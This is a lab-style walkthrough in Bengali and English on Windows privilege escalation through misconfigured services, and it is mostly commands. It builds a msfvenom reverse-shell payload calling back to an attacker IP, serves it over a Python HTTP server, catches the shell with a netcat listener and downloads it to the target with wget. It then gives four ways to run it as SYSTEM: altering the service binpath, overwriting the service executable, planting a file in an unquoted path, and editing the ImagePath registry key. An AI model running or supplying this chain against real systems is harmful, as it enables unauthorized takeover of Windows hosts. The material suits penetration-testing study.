# **WIndows Privilege Escalation via Misconfigured Services**

📝 Windows Services – সংক্ষিপ্ত নোট (বাংলা)

Windows Service হলো এমন একটি program/process যা background-এ continuously run করে, সাধারণত user interaction ছাড়াই।

⚙️ কী কাজ করে:
* System boot হলে automatically start হতে পারে
* OS ও application-এর গুরুত্বপূর্ণ কাজ handle করে
* যেমন: Antivirus, Database, Web Server

🛠️ Management Tool: **services.msc**

✅ সংক্ষেপে:

👉 Service = background process
👉 সবসময় বা দীর্ঘ সময় ধরে run করে

⚠️ Misconfigured Services – সংক্ষিপ্ত নোট

Misconfigured Service হলো এমন service যার configuration ভুলভাবে সেট করা, ফলে attacker সেটিকে exploit করতে পারে।


🔹 Common Misconfigurations:
* Service file/folder-এ weak permission (write access)
* Unquoted service path (space থাকলে vulnerability)
* Service executable replace করা সম্ভব
* Low privilege user service modify করতে পারে

💥 কীভাবে exploit হয়:

👉 Attacker service file modify/replace করে
👉 Service restart হলে malicious code run হয়
👉 Admin/System privilege পাওয়া যায়

⚠️ Risk:
* Privilege Escalation
* System compromise

==> Here I will use cmd and powershel for this privilege escalation

* Find Services:
```
cmd   : sc query
power : Get-CimInstance Win32_Service
```
It shows all services. In cmd modification is difficult. So, I have to use powershell for filter the command for getting specific services

```
power : Get-CimInstance Win32_Service | Where-Object PathName -notmatch 'Windows' | Select Name,PathName
```
* -notmatch --> for not showing windows services, Select Name,PathName --> only shows outservice's Name and PathName
* output: 
```
Name           PathName
----           --------
AmazonSSMAgent "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"
AWSLiteAgent   C:\Program Files\Amazon\XenTools\LiteAgent.exe
daclsvc        "C:\Program Files\DACL Service\daclservice.exe"
dllsvc         "C:\Program Files\DLL Hijack Service\dllhijackservice.exe"
filepermsvc    "C:\Program Files\File Permissions Service\filepermservice.exe"
LSM
NetSetupSvc
regsvc         "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
unquotedsvc    C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
winexesvc      winexesvc.exe

```

* Create a payload in my kali
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.181.155 LPORT=4444 -f exe -o shell.exe

python -m http.server 80     [run python server]

nc -nvlp 4444                [run netcat listener in another terminal on port 4444]
```

* Download the shell.exe to windows using powershell
```
wget http://192.168.181.155/shell.exe -OutFile shell.exe   [wget works in only powershell]
```

### 1st_technique: Insecure Service Permission (service info bin path can be changed)

* Check the service(daclsvc) configuration using cmd
```
sc qc daclsvc
```
output:
```
START_TIME : Demand-start [manually]   /  automatically
Binary_PATH_NAME:  "C:\Program Files\DACL Service\daclservice.exe"
Service-Start-Name: Local System   [the service run as local system]
```
* Now try to change this service binary path 
```
sc config daclsvc binpath = "C:\Users\user\shell.exe"
```
==> If successful then this service will run shell.exe when start

```
sc start daclsvc
```
* Start the service and it will run shell.exe and I will get the reverse shell in my kali linux via netcal listener.



#### 2nd_technique: Insecure service Executables

* Now try for another service named filepermsvc where I can't change the info [no insecure service permission], but I can overwrite the file [Insecure service Executables]

```
sc qc filepermsvc    [check the info of this service]

copy shell.exe "C:\Program Files\File Permission Service\filepermservice.exe" /Y
```
* overwrite shell.exe to "C:\Program Files\File Permission Service\filepermservice.exe" ... Here /Y means --> overwrite permission "YES"

```
sc start filepermsvc
```

* Now start the service and gete the reverse_shell to my kali ...



### 3rd_technique: Unquoted service path

* here in these services there was a service named unquotedsvc which pathname is not quoted..
* Now know about how windows check the file where quote is not given 
```
C:\Program.exe
C:\Program Files\Unquoted.exe
C:\Program Files\Unquoted Path.exe
C:\Program Files\Unquoted Path Service\Common.exe
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
```
* In general a normal user don't have write permission in C or Program Files (upper level folder). But it may have write permission in Unquoted Path Service folder.(low level folder)

```
copy shell.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```
==> If successful then start the service and get reverse shell on my kali as nt-authority user

```
sc start unquotedsvc
```


### 4th_technique: Manually change in reg 

* sc command is like the frontend of the registry(database). It fetch,edit,update,delete data from registries. We also manually change the registry which I had done before by sc command.

* check all info of regsvc service

```
reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc

sc qc regsvc     [this two command shows almost same result]
```

* Now change the ImagePath of regsvc 

```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /V ImagePath /t REG_EXPAND_SZ /d C:\Users\user\shell.exe /f
```

==> /t REG_EXPAND_SZ (type expandable string) .. ImagePath is same as BINARY_PATH_NAME which shows by sc command

```
sc qc regsvc
```

==> Now, you here see that BINARY_PATH_NAME is updated as the given ImagePath by updating the reg. Now simply run this service and get reverse shell in kali

```
sc start regsvc
```